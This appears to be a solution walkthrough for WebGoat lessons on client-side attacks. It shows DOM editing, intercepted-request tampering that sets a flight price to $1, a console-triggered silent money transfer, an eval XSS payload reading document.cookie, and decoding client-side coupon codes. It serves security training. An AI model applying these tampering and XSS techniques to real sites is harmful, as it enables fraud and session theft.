# DOM Injection

Using Chrome 'inspect element' edit the html code for disabled button by removing `disabled=""` and the button is now enabled.

---

# XML Injection

After submitting the given account ID, you will observe that the account balance seem to only review the first 3 rewards (out of total 5). If you check all items and submit them, intercept with burp (or other HTTP intercept tool) you could see the following POST parameters

```
accountID=836239&check1001=on&check1002=on&check1003=on&SUBMIT=Submit
```

Modify the request to include the other 2 rewards (assuming that the naming convention used is in sequential numbering eg. 1001,1002,1003,1004,1005)

```
accountID=836239&check1001=on&check1002=on&check1003=on&check1004=on&check1005=on&SUBMIT=Submit
```

---

# JSON Injection

From: 'BOS'

To: 'SEA'

You will see there are 2 radio buttons, select the one with 0 stops priced at $600 and click submit with burp (or other HTTP intercept tools)

`travelFrom=BOS&travelTo=SEA&radio0=on&SUBMIT=Submit&price2Submit=%24600`

We observe that it is submitting `%24600` which translates to `$600`. Modify the following to make the flight priced cheaper (real cheap at $1!)

`travelFrom=BOS&travelTo=SEA&radio0=on&SUBMIT=Submit&price2Submit=%241`

---

# Silent Transactions Attack

When intercepting HTTP you will notice that GET request is made with all parameters shown eg.

```
GET /WebGoat/attack?Screen=144&menu=400&from=ajax&newAccount=test&amount=123&confirm=Transferring
```

To submit data silently, using Chrome 'Inspect element' and click 'Console' tab and issue `javascript:` and you should see one of the autocompleted commands is `javascript:submitData()`. If you enter it, below is the result

```javascript
javascript:submitDatasubmitData(accountNo, balance) {var url = 'attack?Screen=144&menu=400&from=ajax&newAccount='+ accountNo+ '&amount=' + balance +'&confirm=' + document.getElementById('confirm').value; 
```

We can observe from this function `submitData()` requires 2 parameters which seems like what is the account number and balance amount to transfer. Issue the following command in console.

```javascript
javascript:submitData(123,999999999999999)
```

---

# Dangerous Use of Eval

We can get XSS for appending this to `Enter your three digit access code:`

```javascript
');alert(document.cookie);('
```

---

# Insecure Client Storage

## Stage 1

`Inspect` > `Sources` check javascript folder `clientSideValidation.js`. The Coupons required are actually found below, but they are 'encrypted'. To 'decrypt' the coupons, simply copy the whole block of codes into your developer tool's `console`

```javascript
var coupons = ["nvojubmq",
"emph",
"sfwmjt",
"faopsc",
"fopttfsq",
"pxuttfsq"];

function isValidCoupon(coupon) {
    coupon = coupon.toUpperCase();
    for(var i=0; i<coupons.length; i++) {
        decrypted = decrypt(coupons[i]);  //<-------- HOW TO DECRYPT HERE!!!
        if(coupon == decrypted){
            ajaxFunction(coupon);
            return true;
        }
    }
    return false;   
}

function decrypt(code){
    code = code.toUpperCase();
    alpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    caesar = '';

    for (i = code.length ;i >= 0;i--){  
        for (j = 0;j<alpha.length;j++){     
            if(code.charAt(i) == alpha.charAt(j)){
                caesar = caesar + alpha.charAt((j+(alpha.length-1))%alpha.length);
            }       
        }
    }   
    return caesar;
}
```

Now run the command `decrypted = decrypt(coupons[0]);` ... `decrypted = decrypt(coupons[4]);`

![](/WebGoat/screens/coupons.png)

## Stage 2

After applying the coupons, update quantity of items and see the total cost add up with the coupon discount being applied. Then right click the value of total cost and select `Inspect` , now modify the value to `$0.0` and click `Purchase` button. 

![](/WebGoat/screens/free.png)


